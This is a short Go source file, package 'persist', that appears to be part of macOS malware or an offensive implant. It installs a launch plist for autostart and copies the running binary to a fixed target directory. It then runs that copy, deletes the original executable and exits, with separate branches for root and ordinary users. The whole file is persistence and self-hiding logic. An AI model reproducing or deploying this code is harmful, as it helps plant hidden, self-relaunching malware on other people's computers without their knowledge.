package persist

import(
  "path/filepath"
  "os"

  "../info"
  "../config"
)

func CheckAndExec(i *info.Info){
  if i.GetCurUser() == "root" {
    if len(os.Args) == 2 && os.Args[1] == "1" {
      setPlist(i)
      execTarget(i)
      os.Exit(0)
    }
  } else {
    if(i.GetCurPath() != filepath.Join(i.GetHomePath(), config.TargetDir, config.TargetName)){
      setPlist(i)
      moveToTarget(i)
      execTarget(i)
      os.Remove(i.GetCurPath())
      os.Exit(0)
    }
  }
}
